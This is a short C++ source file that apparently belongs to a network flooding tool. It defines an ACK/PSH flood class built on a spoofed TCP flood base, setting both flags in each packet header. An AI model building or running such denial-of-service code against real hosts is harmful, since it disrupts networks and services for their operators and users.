#include "ack_psh_flood.h"

ack_psh_flood::ack_psh_flood(std::shared_ptr<Config> config)
    : spoofed_tcp_flood(std::move(config)) {}

void ack_psh_flood::finalize_hdr(tcphdr *tcp, iphdr *ip) {
  tcp->th_flags = TH_ACK | TH_PUSH;
  spoofed_tcp_flood::finalize_hdr(tcp, ip);
}
